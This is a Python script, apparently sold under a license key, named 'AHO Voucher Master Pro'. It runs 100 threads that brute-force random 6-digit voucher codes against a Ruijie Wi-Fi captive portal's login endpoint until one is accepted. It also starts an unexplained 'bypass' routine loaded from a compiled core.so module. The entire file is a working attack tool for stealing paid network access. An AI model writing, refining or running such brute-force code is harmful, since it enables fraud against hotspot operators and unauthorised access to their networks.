import sys, os, hashlib, subprocess, datetime, requests, time, threading, random, string
from colorama import Fore, init, Style

init(autoreset=True)

# --- ၁။ LICENSE SYSTEM (အစ်ကို့ Key စနစ်) ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except:
        return datetime.datetime.now()

def get_hwid():
    try:
        user = subprocess.check_output(['whoami']).decode().strip()
    except:
        user = "user"
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    return True

    os.system('clear')
    print(f"{Fore.CYAN}--- AHO MASTER PRO (VOUCHER EDITION) ---")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    user_key = input(f"{Fore.WHITE}\nENTER YOUR LICENSE KEY: ").strip()

    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if user_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f:
                f.write(user_key)
            print(f"{Fore.GREEN}[✔] KEY ACTIVATED!")
            return True
    return False

# --- ၂။ CORE ENGINE INTEGRATION (အစ်ကို့ core.so ကို ချိတ်ဆက်ခြင်း) ---
try:
    import core
    HAS_CORE = True
except ImportError:
    HAS_CORE = False

# --- ၃။ RUIJIE VOUCHER HACK LOGIC (6-DIGIT) ---
_found = False
_tested = 0

def engine(host):
    global _found, _tested
    sess = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    # Ruijie ရဲ့ Default API Path
    url = f"http://{host}/login/auth" 

    while not _found:
        # Digit သီးသန့် ၆ လုံး ထုတ်မယ်
        code = "".join(random.choice(string.digits) for _ in range(6))
        try:
            payload = {"username": code, "password": "", "auth_type": "voucher"}
            res = sess.post(url, data=payload, headers=headers, timeout=5)
            _tested += 1
            
            if res.status_code == 200:
                if '"success":true' in res.text or '"error":0' in res.text:
                    _found = True
                    print(f"\n\n{Fore.GREEN}[✔] VOUCHER FOUND: {Fore.WHITE}{code}")
                    os._exit(0)
        except:
            pass

# --- ၄။ MAIN EXECUTION ---
def start_hack():
    os.system('clear')
    print(f"{Fore.CYAN}{Style.BRIGHT}=========================================")
    print(f"{Fore.GREEN}{Style.BRIGHT}      AHO VOUCHER MASTER PRO 2026       ")
    print(f"{Fore.CYAN}{Style.BRIGHT}=========================================")
    
    # .ip ဖိုင်ရှိရင် အဲ့ဒီထဲက IP ကို သုံးမယ်၊ မရှိရင် Ruijie default ကို သုံးမယ်
    if os.path.exists(".ip"):
        with open(".ip", "r") as f:
            target_ip = f.read().strip()
    else:
        target_ip = "192.168.110.1"

    print(f"{Fore.YELLOW}[*] Engine Status: {'[OK] core.so active' if HAS_CORE else '[!] basic mode'}")
    print(f"{Fore.YELLOW}[*] Target Gateway: {target_ip}")
    print(f"{Fore.WHITE}-----------------------------------------")

    # core.so ထဲမှာ bypass logic ပါရင် အရင် run မယ်
    if HAS_CORE:
        if hasattr(core, 'run_bg_bypass'):
            threading.Thread(target=core.run_bg_bypass, daemon=True).start()

    # Voucher Hack ကို thread ၁၀၀ နဲ့ စမယ်
    for i in range(100):
        threading.Thread(target=engine, args=(target_ip,), daemon=True).start()
    
    while not _found:
        sys.stdout.write(f"\r{Fore.RED}[☠] Tested Codes: {Fore.WHITE}{_tested}")
        sys.stdout.flush()
        time.sleep(0.1)

if __name__ == "__main__":
    if check_access():
        start_hack()
    else:
        print(f"{Fore.RED}[✘] INVALID LICENSE KEY!")
